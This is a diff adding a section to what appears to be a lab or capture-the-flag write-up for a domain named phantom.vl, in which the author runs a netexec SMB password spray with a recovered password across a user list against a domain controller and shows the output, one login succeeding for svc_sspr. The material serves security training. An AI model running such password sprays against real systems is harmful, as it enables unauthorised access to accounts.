@@ -583,3 +583,42 @@ Found this in `/config/config.boot`
 
 There doesnt appear to be anything else interesting
 
+# Password spray leads to user compromise
+
+```python
+nxc smb dc.phantom.vl -u users.txt -p 'gB6XTcqVP5MlP7Rc' --continue-on-success
+SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ibryant:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\wstewart:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vhoward:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\crose:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\twright:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\fhanson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\cferguson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\alucas:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ebryant:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vlynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ghall:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ssimpson:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ccooper:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE 
+SMB         10.129.234.63   445    DC               [-] phantom.vl\vcunningham:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
+```
+
+I now have compromise the user `svc_sspr`
+
